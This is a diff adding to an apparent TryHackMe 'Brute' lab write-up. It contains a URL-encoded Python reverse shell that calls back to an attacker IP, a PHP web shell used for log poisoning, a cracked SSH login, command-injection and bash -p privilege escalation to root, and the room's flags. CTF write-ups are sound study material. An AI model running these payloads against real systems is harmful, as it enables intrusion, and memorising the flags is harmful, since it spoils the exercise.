@@ -163,3 +163,56 @@ MySQL [mysql]> SELECT user, CONCAT('$mysql', SUBSTR(authentication_string,1,3), 
 ```
 http://10.10.148.34/welcome.php?cmd=python3%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.13.46.127%22,1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27
 ```
+
+php script (https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d)
+```
+'<?php system($_GET['cmd']); ?>'
+```
+
+hash
+```
+E793DE9FF70DA71A13BA66833A5CB6AE2DD8D82B
+```
+
+hashcat broken password
+```
+[22][ssh] host: 10.10.158.108   login: adrian   password: theettubrute!
+
+```
+
+We're in!
+`THM{PoI$0n_tH@t_L0g}`
+
+```
+adrian@brute:~/ftp/files$ cat script
+#!/bin/sh
+while read line;
+do
+  /usr/bin/sh -c "echo $line";
+done < /home/adrian/punch_in
+adrian@brute:~/ftp/files$ ls -la
+total 16
+drwxr-xr-x 2 adrian adrian  4096 Oct 23  2021 .
+drwxr-xr-x 3 nobody nogroup 4096 Oct 20  2021 ..
+-rw-r----- 1 adrian adrian   203 Oct 20  2021 .notes
+-rw-r----- 1 adrian adrian    90 Oct 21  2021 script
+adrian@brute:~/ftp/files$ cat .notes
+That silly admin
+He is such a micro manager, wants me to check in every minute by writing
+on my punch card.
+
+He even asked me to write the script for him.
+
+Little does he know, I am planning my revenge.
+adrian@brute:~/ftp/files$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+
+```
+
+```
+adrian@brute:~$ /bin/bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt
+THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}
+```
